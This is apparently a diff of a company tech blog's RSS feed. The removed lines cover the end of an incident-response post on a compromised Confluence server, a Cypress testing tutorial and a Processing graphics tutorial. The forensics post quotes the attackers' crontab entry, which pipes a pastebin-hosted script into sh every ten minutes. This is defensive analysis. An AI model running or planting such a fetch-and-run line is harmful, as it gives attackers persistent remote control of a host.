-root@siftworkstation:~# rkhunter --propupd
-root@siftworkstation:~# rkhunter -c  -l /var/log/rkhunter-scan-evidence.txt
-System checks summary
-=====================
-File properties checks...
-Files checked: 212
-Suspect files: 63
-Rootkit checks…
-Rootkits checked : 378
-Possible rootkits: 0
-Applications checks...
-All checks skipped
-The system checks took: 3 minutes and 31 seconds
-All results have been written to the log file: /var/log/rkhunter-scan-evidence.txt
-One or more warnings have been found while checking the system.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;h3 id=&quot;reverse-engineering-malware&quot;&gt;Reverse Engineering Malware&lt;/h3&gt;
-
-&lt;p&gt;I won&amp;#39;t go into much deatil here since the security firm Anomali has posted a detailed analysis of this exploit and associated malware &lt;a href=&quot;https://www.anomali.com/blog/rocke-evolves-its-arsenal-with-a-new-malware-family-written-in-golang&quot;&gt;here&lt;/a&gt;. However, I will note a few things.&lt;/p&gt;
-
-&lt;h2 id=&quot;crontab&quot;&gt;CRONTAB&lt;/h2&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;*/10 * * * * (curl -fsSL https://pastebin.com/raw/wR3ETdbi||wget -q -O- https://pastebin.com/raw/wR3ETdbi)|sh
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;This cronjob was found in the the crontab of the user running Confluence. As you can see this job runs every 10 minutes and grabs a script from pastebin. The attackers are essentially using pastebin.com here for Command &amp;amp; Control. So all they have to do is update their pastbin to push out an update to their malware. Sadly, pretty smart when you think about it! 😒&lt;/p&gt;
-
-&lt;p&gt;I&amp;#39;ll also note they dropped in a SystemD config to ensure their Monero miner was always running. Yep, even cyber criminals can make use of SystemD to ensure their malware stays running! 😜 &lt;/p&gt;
-
-&lt;h2 id=&quot;noteworthy-items&quot;&gt;Noteworthy Items&lt;/h2&gt;
-
-&lt;ol&gt;
-&lt;li&gt;&lt;a href=&quot;https://aws.amazon.com/guardduty/&quot;&gt;AWS GuardDuty&lt;/a&gt; showed &lt;strong&gt;high severity alerts 6 days prior&lt;/strong&gt; to Confluence going down! 🤔 We now have a CloudWatch event for high severity GuardDuty findings that notifies us via AWS &lt;a href=&quot;https://aws.amazon.com/sns/&quot;&gt;SNS&lt;/a&gt;. 😂&lt;/li&gt;
-&lt;li&gt;It would have been much more difficult to recover here without a &amp;#39;known good&amp;#39; snapshot.&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h3&gt;
-
-&lt;p&gt;A long story short, our Confluence instance was compromised by an unpatched plugin, EC2 instance rebuilt from a &amp;#39;known good&amp;#39; snapshot, blameless postmortem conducted, and remediation items captured &amp;amp; resolved.&lt;/p&gt;
-
-&lt;p&gt;Stay safe out there! 😁&lt;/p&gt;
+&lt;p&gt;That&amp;#39;s it! Your application should now be able to make requests to your API Gateway endpoints.&lt;/p&gt;
 </description>
-        <pubDate>Mon, 05 Aug 2019 00:00:00 -0400</pubDate>
-        <link>https://technology.customink.com//blog/2019/08/05/performing-digital-forensics-on-an-aws-ebs-volume/</link>
-        <guid isPermaLink="true">http://technology.customink.com//blog/2019/08/05/performing-digital-forensics-on-an-aws-ebs-volume/</guid>
-      </item>
-    
-      <item>
-        <title>Integration Testing React Apps with Cypress</title>
-        <description>&lt;h3 id=&quot;what-is-cypress&quot;&gt;What is Cypress?&lt;/h3&gt;
-
-&lt;p&gt;Cypress is an end to end testing framework for JavaScript apps. It helps you run and automate tests on the browser for your entire web experience. Cypress uses a headless browser to navigate through your app and perform user actions following a set of test scripts. &lt;/p&gt;
-
-&lt;p&gt;This is a quick post on getting started with Cypress in your React app, explores some of its cool features for integration testing, and how to add Cypress to your Travis CI/CD pipeline. &lt;/p&gt;
-
-&lt;p&gt;Although this post calls out React, Cypress is applicable to any JavaScript framework, and there&amp;#39;s nothing specific about the setup, so it can be applied to any non React app as well. &lt;/p&gt;
-
-&lt;h3 id=&quot;why-cypress-is-awesome-and-you-should-use-it&quot;&gt;Why Cypress is awesome and you should use it:&lt;/h3&gt;
-
-&lt;ul&gt;
-&lt;li&gt;Cypress records screenshots and videos of your test runs, so you can trace back what went wrong - incredibly helpful for debugging&lt;/li&gt;
-&lt;li&gt;Live reloading - watches changes in test files and reruns your tests (we expect nothing less in the React world...)&lt;/li&gt;
-&lt;li&gt;DOESN&amp;#39;T use Selenium - we used to use Selenium for integration testing, but tests would fail due to asynchronous loading. Cypress intuitively waits for HTML DOM nodes to load if it doesn&amp;#39;t find it initially. Cypress has built-in retrying and customizable timeouts. &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;using-cypress-in-your-react-app&quot;&gt;Using Cypress in your React app:&lt;/h3&gt;
-
-&lt;p&gt;Cypress is super easy to integrate in with your React app. Its setup is minimal. So let&amp;#39;s get started:&lt;/p&gt;
-
-&lt;h5 id=&quot;1-add-cypress-as-a-npm-package&quot;&gt;1. Add cypress as a NPM package:&lt;/h5&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;yarn add cypress --dev
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;h5 id=&quot;2-start-your-server-and-run&quot;&gt;2. Start your server, and run:&lt;/h5&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;yarn run cypress open
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;This will open the Cypress test runner&lt;/p&gt;
-
-&lt;h5 id=&quot;3-give-cypress-a-baseurl-in-cypress-json&quot;&gt;3. Give Cypress a baseURL in &lt;code&gt;cypress.json&lt;/code&gt;&lt;/h5&gt;
-
-&lt;p&gt;&lt;code&gt;{ &amp;quot;baseUrl&amp;quot;: &amp;quot;http://localhost:3000&amp;quot; }&lt;/code&gt;&lt;/p&gt;
-
-&lt;h5 id=&quot;4-write-our-first-test&quot;&gt;4. Write our first test!&lt;/h5&gt;
-
-&lt;p&gt;In your test directory, create your test file. We named ours a simple &lt;code&gt;does-it-work-test.js&lt;/code&gt; which just runs through the happy path of the Assisted Design portion of the lab experience. &lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;describe('assisted design', () =&amp;gt; {
-  it('should select default shirt and ink colors', () =&amp;gt; {
-    cy.visit('/');
-    cy.get('.ad-GateTest-button').click();
-    cy.get('.ad-selfSelectionScreen-skip').click();
-    cy.get('.ad-productColorLg-colors-name').should('contain', 'White');
-    cy.get('.ad-productColorLg-cta').click();
-    cy.get('.ad-inkColorLg-colors-name').should('contain', 'Black');
-  })
-})
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;Familiar, right? The first command tells Cypress to visit the root URL in Chrome, which loads up Custom Ink&amp;#39;s assisted design experience. &lt;/p&gt;
-
-&lt;p&gt;The next command finds the &lt;code&gt;.ad-GateTest-button&lt;/code&gt;, which appears as the blue &amp;quot;Try it&amp;quot; button, and clicks on it. This renders the next design theme screen - where Cypress finds the DOM node for &amp;quot;Skip this step&amp;quot; button. On the next page for shirt color selection, Cypress asserts the selected product color in span &lt;code&gt;.ad-productColorLg-colors-name&lt;/code&gt; is white. &lt;/p&gt;
-
-&lt;p&gt;You can guess the last two lines - Cypress clicks on the Next button (&lt;code&gt;.ad-productColorLg-cta&lt;/code&gt;), leading to the ink color selection page, where it asserts the selected ink color in span &lt;code&gt;.ad-inkColorLg-colors-name&lt;/code&gt; is Black. That&amp;#39;s the gist of it!&lt;/p&gt;
-
-&lt;p&gt;To run the new test, click on the name of your test file under &amp;quot;Tests&amp;quot; in the Cypress test runner, and it should run your tests in the browser. &lt;/p&gt;
-
-&lt;h5 id=&quot;4-explore-visual-history-navigation&quot;&gt;4. Explore visual history navigation:&lt;/h5&gt;
-
-&lt;p&gt;On the browser, you can click through the left side to see exactly how Cypress executed your test scripts, so you can walk through each step of your test. When something goes awry, you can retrace the steps, and helps you gain clarity on what went wrong in either your test script, or your code. &lt;/p&gt;
-
-&lt;p&gt;&lt;img class=&quot;tb-Img&quot; src=/assets/content/cypress/cypress-nav-284961bfd5b625abb9a41415d598d9a976bde5e4e956be7c972c1ac12941b770.gif /&gt;&lt;/p&gt;
-
-&lt;h5 id=&quot;5-selector-playground&quot;&gt;5. Selector playground:&lt;/h5&gt;
-
-&lt;p&gt;On the top Cypress nav bar, directly left of where Cypress displays the URL bar, you can click to open the Selector Playgroud. This is similar (but way more intuitive) to a browser&amp;#39;s inspect element feature, where you can click around to find the right DOM element you want to add to your test suite or make an assertion on. It makes it easy to copy to clipart and paste into a test. &lt;/p&gt;
-
-&lt;p&gt;&lt;img class=&quot;tb-Img&quot; src=/assets/content/cypress/cypress-selector-f73313665a7bead2fedba190b02d297029a1f863f85ffab51e87a7d4aff5590f.gif /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;adding-cypress-to-travis&quot;&gt;Adding Cypress to Travis:&lt;/h3&gt;
-
-&lt;p&gt;We wanted to add Cypress to our Travis workflow, so we can run integration testing whenever new features are added to make sure new code doesn&amp;#39;t break existing features during deployments. &lt;/p&gt;
-
-&lt;h5 id=&quot;1-we-add-a-yarn-script-in-package-json&quot;&gt;1. We add a yarn script in &lt;code&gt;package.json&lt;/code&gt;&lt;/h5&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;&quot;start:ci&quot;: &quot;NODE_ENV=development $(yarn bin)/webpack-dev-server&quot;
-
-&quot;test:integration:ci&quot;: &quot;yarn start:ci &amp;amp; $(yarn bin)/wait-on
-  http://localhost:5000 &amp;amp;&amp;amp; $(yarn bin)/cypress run --config 
-  baseUrl=http://localhost:5000&quot;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;The &lt;a href=&quot;https://www.npmjs.com/package/wait-on&quot;&gt;wait-on&lt;/a&gt; package makes sure webpack starts the webserver on localhost:5000 before running Cypress tests against it. &lt;/p&gt;
-
-&lt;h5 id=&quot;2-add-the-cypress-yarn-script-to-travis-yml&quot;&gt;2. Add the Cypress yarn script to &lt;code&gt;travis.yml&lt;/code&gt;&lt;/h5&gt;
-
-&lt;p&gt;In our yaml file, we run the script &lt;code&gt;yarn run $TEST_SUITE&lt;/code&gt;.
-Our &lt;code&gt;$TEST_SUITE&lt;/code&gt; includes our lint and unit test, so we just add &lt;code&gt;test:integration:ci&lt;/code&gt; from our &lt;code&gt;package.json&lt;/code&gt; to it. &lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;- TEST_SUITE=test:integration:ci
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;Now, Cypress is part of your Travis run! CI/CD FTW! &lt;/p&gt;
-
-&lt;h3 id=&quot;learn-more&quot;&gt;Learn more:&lt;/h3&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://docs.cypress.io/guides/overview/why-cypress.html#In-a-nutshell&quot;&gt;Cypress docs&lt;/a&gt;&lt;/p&gt;
-
-&lt;h5 id=&quot;ke-is-a-software-engineer-at-custom-ink-and-works-on-custom-inks-design-lab-experience&quot;&gt;Ke is a software engineer at Custom Ink, and works on Custom Ink&amp;#39;s design lab experience.&lt;/h5&gt;
-</description>
-        <pubDate>Mon, 29 Jul 2019 00:00:00 -0400</pubDate>
-        <link>https://technology.customink.com//blog/2019/07/29/integration-testing-react-apps-with-cypress/</link>
-        <guid isPermaLink="true">http://technology.customink.com//blog/2019/07/29/integration-testing-react-apps-with-cypress/</guid>
-      </item>
-    
-      <item>
-        <title>Let's Get Visual With Processing</title>
-        <description>&lt;p&gt;I recently started mentoring graduates from &lt;a href=&quot;https://lambdaschool.com/&quot;&gt;Lambda School&lt;/a&gt; and while reviewing my mentee’s resume (&lt;a href=&quot;http://erikkimsey.com/&quot;&gt;he’s super creative and looking for work in the Virginia area!!!&lt;/a&gt;) I saw on his resume under skills ‘Processing’ at first I thought it must of been a typo…I was wrong.&lt;/p&gt;
-
-&lt;!--more--&gt;
-
-&lt;p&gt;Processing isn’t a super popular framework, it isn’t running at the latest start-ups and big companies aren’t using it to save time or money on their cloud infrastructure. It&amp;#39;s a framework for writing code to create visual art, it is often used by students, artists and designers.&lt;/p&gt;
-
-&lt;h2 id=&quot;why-learn-processing&quot;&gt;Why Learn Processing?&lt;/h2&gt;
-
-&lt;ul&gt;
-&lt;li&gt;It’s a cool way to get to know some basics of Java (you can also use coffeescript or javascript)&lt;/li&gt;
-&lt;li&gt;The Processing IDE has matured and is pretty enjoyable to use&lt;/li&gt;
-&lt;li&gt;You’re new to programming or statically typed languages and you want an easy and fun intro&lt;/li&gt;
-&lt;li&gt;You’re an artist that wants to try out a new medium&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p class=&quot;frak&quot;&gt;
-  With that said, its cool to step outside the box and try something new every now and then, so let’s check it out.
-  Be mindful, this is just an intro...don't judge my art too harshly.
-
-  &lt;!-- ![alt text](https://media.giphy.com/media/9V7qW099yYNyrgagqF/giphy.gif) --&gt;
-  &lt;img class=&quot;tb-Img tb-Img--responsive tb-Img--fancy&quot; src=&quot;https://media.giphy.com/media/9V7qW099yYNyrgagqF/giphy.gif&quot;&gt;
-&lt;/p&gt;
-
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://processing.org/download/&quot;&gt;Download Processing Here&lt;/a&gt;&lt;/p&gt;
-
-&lt;div&gt;
-
-  &lt;div&gt;
-
-  Once you have it installed go a head and open it up and let's check out the UI.
-
-  &lt;/div&gt;
-
-
-
-&lt;img class=&quot;em-28&quot;alt=&quot;processing-UI&quot; src=/assets/content/processing/2019-07-23_2323-345741e1030f3f4fb0e81f84f6e1bc9d8cf5f02a202cfab4221c2fbf8768d6e6.png class=&quot;tb-Img-processing tb-Img--fancy&quot; /&gt;
-
-&lt;img class=&quot;em-28&quot;alt=&quot;processing-UI&quot; src=/assets/content/processing/2019-07-24_2058-0ae2fa145e4510dff9bbebd01327ed83d2219c74972a75f9395b25c5cdbf4477.png class=&quot;tb-Img-processing tb-Img--fancy&quot; /&gt;
-
-&lt;/div&gt;
-
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;There are two methods that every  Processing sketchbook should have.&lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;setup&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;800&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;600&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-
-&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-
-
-&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;draw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-     &lt;span class=&quot;n&quot;&gt;rect&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;p&gt;&lt;code&gt;setup&lt;/code&gt; will have the default settings for the sketchbook, it will run once at the start of each sketchbook to set the canvas size and any other settings you might want at the initial start up. We currently have our canvas set to 800px X 600px&lt;/p&gt;&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;&lt;code&gt;draw&lt;/code&gt; is a method that will run 10 times per second, redrawing and executing the code in side the draw method until explicitly stopped. Inside the &lt;code&gt;draw&lt;/code&gt; method we draw a rectangle, the first value is the X start position, the second is the Y start position, the third is the width and the fourth is the height. The origin point, starting point of the axes,  in Processing is the top left corner.&lt;/p&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;After running this sketch book you should get this:&lt;/p&gt;
-
-&lt;p&gt;&lt;img class=&quot;em-28&quot;alt=&quot;processing-UI&quot; src=/assets/content/processing/2019-07-24_2106-df211f48b40921b6e418d0eefa28cffb1b965d0cc73f331faeeabaf2cc0c5ef6.png class=&quot;tb-Img-processing tb-Img--fancy&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Let’s remove the border of the rectangle &lt;code&gt;noStroke&lt;/code&gt; (border of the rectangle),  set the color of the rectangle to red &lt;code&gt;fill&lt;/code&gt;and re-draw it wherever we move the mouse by using &lt;code&gt;mouseX&lt;/code&gt; &amp;amp; &lt;code&gt;mouseY&lt;/code&gt;. The fill method takes arguments for red, green &amp;amp; blue.&lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;draw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;fill&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;noStroke&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;rect&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mouseX&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mouseY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;div class=&quot;flex-center&quot;&gt;
-
-&lt;img class=&quot;tb-Img tb-Img--responsive tb-Img--fancy&quot; src=&quot;https://media.giphy.com/media/ZFWLrG5kD0JkDcNf8m/giphy.gif&quot;&gt;
-
-&lt;/div&gt;
-
-&lt;div class=&quot;clear&quot;&gt;
-
-We could also vary the color of red so that it is a random shade. We add a method called `randomRed` that will set the fill to a random number between 0 and 255 for the red value.
-
-&lt;/div&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;draw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-   &lt;span class=&quot;n&quot;&gt;noStroke&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
-   &lt;span class=&quot;n&quot;&gt;randomRed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
-   &lt;span class=&quot;n&quot;&gt;rect&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mouseX&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mouseY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-
-
-&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;randomRed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;fill&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;div class=&quot;flex-center&quot;&gt;
-  &lt;img class=&quot;tb-Img tb-Img--responsive tb-Img--fancy&quot; src=&quot;https://media.giphy.com/media/LQ37QpemioRX61nqy6/giphy.gif&quot;&gt;
-&lt;/div&gt;
-
-&lt;p&gt;Let’s add a variety of colors, we will recreate the method that we used for the &lt;code&gt;randomRed&lt;/code&gt; for green and blue and then pick between those 3 methods randomly.&lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;span class=&quot;c1&quot;&gt;//add this line to the top of the file&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.util.concurrent.ThreadLocalRandom&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
-
-
-&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;setup&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;800&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;600&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;draw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-   &lt;span class=&quot;n&quot;&gt;noStroke&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
-   &lt;span class=&quot;n&quot;&gt;randomColor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
-   &lt;span class=&quot;n&quot;&gt;rect&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mouseX&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mouseY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-
-
-
-&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;randomColor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt;
-    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;random_index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ThreadLocalRandom&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;current&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;nextInt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-
-    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random_index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-      &lt;span class=&quot;n&quot;&gt;randomBlue&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
-    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random_index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-      &lt;span class=&quot;n&quot;&gt;randomRed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
-    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-      &lt;span class=&quot;n&quot;&gt;randomGreen&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
-    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-
-
-
-&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;randomRed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;fill&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-
